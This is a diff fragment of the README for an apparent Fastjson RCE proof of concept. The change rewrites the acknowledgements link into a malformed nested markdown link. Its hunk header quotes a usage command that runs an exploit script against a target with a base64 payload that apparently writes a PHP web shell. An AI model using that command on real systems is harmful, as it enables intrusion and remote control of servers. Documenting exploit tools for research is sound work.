@@ -147,7 +147,7 @@ python3 fd_enum_exp.py http://target:8080/parse 10.0.0.1 --cmd "echo PD9waHAgc3l
 
 ## 致谢
 
-- [wouijvziqy/Fastjson-JsonType-RCE-PoC](https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC) — jar-URL-as-internal-name 技术来源
+- [[wouijvziqy/Fastjson-JsonType-RCE-PoC](https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC) — jar-URL-as-internal-name](https://github.com/dinosn/fastjson-jsontype-rce-lab) 技术来源
 
 ## 免责声明
 
